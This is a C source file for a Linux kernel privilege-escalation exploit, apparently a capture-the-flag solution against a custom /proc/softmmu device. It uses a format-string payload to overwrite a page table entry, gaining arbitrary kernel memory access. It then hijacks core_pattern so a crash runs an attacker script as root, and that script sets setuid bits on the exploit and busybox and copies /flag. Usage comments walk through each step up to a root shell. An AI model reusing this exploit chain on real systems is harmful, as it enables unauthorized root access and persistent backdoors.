// gcc --no-pie -fno-pie -m32 -static exploit.c -o exploit
// musl-gcc --no-pie -fno-pie -m32 -static exploit.c -o exploit

// - Obtaining arbitrary R/W by overwriting the PTE
// - Override core_path to run a script as root

// 1. execute: ./exploit

// 2. create a 'rootme' script
// cat > /tmp/pwned << 'EOF'
// #!/bin/sh
// chmod 4777 /tmp/exploit
// chmod 4777 /bin/busybox
// cat /etc/init.d/rcS > /tmp/rcS
// cat /flag > /tmp/flag
// EOF
// chmod +x /tmp/pwned

// 3. cause a SIGSEGV
// sleep 100 &
// kill -SEGV %1

// 4. execute: ./exploit or just read the flag

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

#define PAGE_OFFSET 0xC0000000

int main(int argc, char** argv) {
  unsigned long map_addr = 0x200000;
  unsigned long map_size = 0x1000;
  
  if (geteuid() == 0) {
      printf("[+] Root!\n");
      setuid(0);
      setgid(0);
      execl("/bin/sh", "sh", NULL);
      return 0;
  }

/*
  if (argc != 2) {
    printf("Usage: %s payload\n",argv[0]);
    return 1;
  }
*/

  // map the payload address
  char *p = (char*)mmap((void*)map_addr, map_size, PROT_READ|PROT_WRITE|PROT_EXEC , MAP_ANONYMOUS | MAP_SHARED, 0, 0);
  if((unsigned long)p < 0) {
   perror("mmap");
  }

  // copy payload
  //memcpy(p, argv[1], strlen(argv[1]));
  char *payload = "%7c%n%74c%n%312c%n";
  memcpy(p, payload, strlen(payload));

  // open /proc/softmmu
  int fd = open("/proc/softmmu",O_RDWR);
  if (fd == -1) {
   perror("open");
  }

  // write to /proc/softmmu
  write(fd,"\x00\x00\x20",4);

  // read from /proc/softmmu
   unsigned char dummy[4];
   read(fd,dummy,4);
 
  // core_pattern
  unsigned long VA = 0xc1895760;
  unsigned long PA = VA - PAGE_OFFSET;
  unsigned long PFN = PA >> 12;
  unsigned long new_pte = (PFN << 12) | 0x067;
  printf("[+] New PTE: 0x%lx\n",new_pte);

  // %7c%n%74c%n%312c%n --> 0x1895067  (good enough)

  // Invalidate TLB
  mprotect(p, map_size, PROT_READ | PROT_WRITE);
  mprotect(p, map_size, PROT_READ | PROT_WRITE | PROT_EXEC);

  // Overwrite core pattern
  printf("[+] Current value: %s\n",p+0x760);
  char *new_path =  "|/tmp/pwned\x00";
  memcpy(p+0x760,new_path,strlen(new_path)+1);
  printf("[+] New value: %s\n",p+0x760);

  // a little test
  FILE* f = popen("cat /proc/sys/kernel/core_pattern","r");
  unsigned char buf[30];
  fread(buf,30,1,f);
  printf("[+] /proc/sys/kernel/core_pattern: %s\n",buf);

  // it works! but crashes after it
  pid_t pid = fork();
  if (pid == 0) {
    puts(
      "Next steps:\n\n"
      "cat > /tmp/pwned << 'EOF'\n"
      "#!/bin/sh\n"
      "chmod 4777 /tmp/exploit\n"
      "chmod 4777 /bin/busybox\n"
      "cat /etc/init.d/rcS > /tmp/rcS\n"
      "cat /flag > /tmp/flag\n"
      "EOF\n"
      "chmod +x /tmp/pwned\n" 
      "sleep 100 &\n"
      "kill -SEGV %1\n\n"
    );
    execl("/bin/sh", "sh", NULL);
  } else {
    printf("[+] Launching shell, PID %d\n", pid);
  }

  return 0;
}